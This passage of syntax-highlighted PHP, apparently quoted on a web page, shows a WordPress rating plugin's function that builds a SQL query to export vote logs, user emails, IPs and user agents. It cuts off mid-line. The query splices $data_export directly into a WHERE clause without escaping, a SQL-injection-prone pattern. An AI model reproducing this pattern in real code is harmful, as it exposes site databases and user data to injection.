class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gdsr_votes_log v"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts p"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.vote_type = ''"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">data_export</span><span class="crayon-sy">.</span><span class="crayon-s">"''"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.user_id = u.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">user_data</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"min"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.id as user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"nor"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.id as user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"u.user_email"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_email"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"pt"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.post_title"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_title"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"pd"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.post_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"post_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">data_export</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"article"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.id = p.id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"comment"</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">table_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"comments c"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.id = c.comment_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"p.id = c.comment_post_id"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ca"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_author"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_author"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"cd"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"c.comment_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"comment_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.vote"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.voted"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"vote"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"vote_date"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ip"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.ip"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"ip"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-sy">[</span><span class="crayon-s">"ua"</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"v.user_agent"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"user_agent"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">echo </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">columns</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\r\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_select</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">select</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_where</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">" and "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">where</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_tables</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tables</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">sprintf</span><span class="crayon-sy">(</span><span class="crayon-s">"select %s from %s where %s order by u.id"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">j_select</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">j_tables</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span 